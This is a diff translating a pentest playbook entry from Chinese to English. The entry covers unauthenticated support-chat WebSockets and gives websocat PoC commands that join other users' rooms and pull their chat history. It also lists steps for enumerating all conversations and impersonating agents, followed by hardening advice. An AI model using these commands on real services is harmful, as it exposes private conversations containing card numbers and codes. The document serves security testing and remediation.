@@ -1,59 +1,59 @@
 ﻿---
-title: 客服 IM / WebSocket 未鉴权（订阅他人会话）
-cve: 无（实现缺陷）
+title: Unauthenticated support IM / WebSocket (subscribe to others' conversations)
+cve: None (implementation flaw)
 severity: high
 cvss: 8.2
-product: 自研客服系统 / socket.io / 原生 WS
-versions: 任意
+product: Custom support system / socket.io / native WS
+versions: Any
 ports: 80, 443
-keywords: websocket, socket.io, im, 客服, 未鉴权, room, 订阅
-entry: ws://host/ws 无 token 直接订阅 room
+keywords: websocket, socket.io, im, support, unauthenticated, room, subscription
+entry: Subscribe to room directly via ws://host/ws without a token
 verified: false
-sources: 公开资料整理（业务逻辑类，无 CVE）
+sources: Compiled from public sources (business logic; no CVE)
 ---
 
-## 指纹
+## Fingerprints
 
 ```
 ws://target/ws?token=xxx        ws://target/socket.io/?EIO=4&transport=websocket
-/socket.io/socket.io.js         客服域名（kf./service./chat.）
-握手消息里出现 {"room":"user_10086"} / {"type":"join"}
+/socket.io/socket.io.js         support domains (kf./service./chat.)
+Handshake messages contain {"room":"user_10086"} / {"type":"join"}
 ```
 
-## 前置条件
+## Prerequisites
 
-- 能连 WS（浏览器控制台或 `websocat`）；授权账号。
+- Ability to connect to WS (browser console or `websocat`); an authorized account.
 
 ## PoC
 
 ```bash
-# 1) 不带 token 连接，看是否接受
+# 1) Connect without a token and check acceptance
 websocat ws://target/ws
 
-# 2) 订阅他人房间
+# 2) Subscribe to another user's room
 websocat -t ws://target/ws
 {"action":"join","room":"user_10001"}
 {"action":"history","room":"user_10001","limit":50}
 
-# 3) socket.io 形态
+# 3) socket.io variant
 websocat 'wss://target/socket.io/?EIO=4&transport=websocket'
 40{"room":"agent_1"}
 ```
 
-## 利用步骤
+## Exploitation Steps
 
-1. 抓自己会话的 WS 帧，记录 `join`/`auth` 消息格式。
-2. 去掉 token 或改 `room` 为他人 id，看是否返回聊天记录/可发消息。
-3. 命中后能读：客服与会员对话（常含账号、卡号、验证码）、可冒充客服发消息（社工面）。
-4. 与 `member-data-enumeration.md` 组合：遍历 room 拿全站会话。
-5. 证据：一帧订阅 + 一帧返回（脱敏）。
+1. Capture WS frames for your own conversation and record the `join`/`auth` message format.
+2. Remove the token or change `room` to another user's id; check whether chat history is returned/messages can be sent.
+3. Success exposes support/member conversations (often including accounts, card numbers, verification codes), and may allow impersonating support to send messages (social-engineering impact).
+4. Combine with `member-data-enumeration.md`: enumerate rooms to obtain site-wide conversations.
+5. Evidence: one subscription frame + one returned frame (redacted).
 
-## 修复与缓解（加固）
+## Remediation and Mitigation (Hardening)
 
-- 握手阶段鉴权（token 校验后再升级），拒绝匿名连接；
-- 房间归属校验（只能订阅自己的 room，客服订阅需角色）；
-- 消息限速 + 审计 + 敏感词与验证码不外发。
+- Authenticate during the handshake (validate the token before upgrading); reject anonymous connections;
+- Validate room ownership (users may subscribe only to their own room; support subscriptions require a role);
+- Rate-limit messages + audit + prevent outward transmission of sensitive terms and verification codes.
 
-## 参考
+## References
 
 - OWASP WebSocket Security Cheat Sheet。
